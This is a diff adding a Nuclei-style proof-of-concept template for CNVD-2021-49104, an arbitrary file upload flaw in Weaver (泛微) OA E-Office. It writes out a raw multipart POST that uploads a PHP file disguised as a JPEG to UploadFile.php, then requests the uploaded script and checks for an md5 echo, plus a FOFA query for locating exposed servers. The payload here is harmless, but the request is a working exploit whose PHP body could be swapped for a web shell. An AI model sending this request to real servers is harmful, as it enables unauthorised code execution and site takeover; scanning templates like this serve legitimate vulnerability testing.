@@ -1,0 +1,55 @@
+id: poc-local-oa-weaver-eoffice-UploadFile-php-upload-CNVD-2021-49104
+
+info:
+  name: 泛微OA E-Office UploadFile.php 任意文件上传漏洞 CNVD-2021-49104
+  author: capiton
+  severity: critical
+  description: 在/general/index/UploadFile.php中上传文件过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20UploadFile.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-49104.html
+  metadata:
+    fofa-query: app="泛微-EOffice"
+    Vulnerability-Impact: 泛微OA V8
+  tags: weaver,ecology,fanwei,eoffice
+
+variables:
+  randomInt: "{{rand_int(100000,999999)}}"
+  md5_randomPayload: "{{md5(randomInt)}}"
+
+requests:
+  - raw:
+      - |
+        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5({{randomInt}});?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+
+
+  - method: GET
+    path:
+      - "{{RootURL}}/images/logo/logo-eoffice.php"
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randomPayload}}"
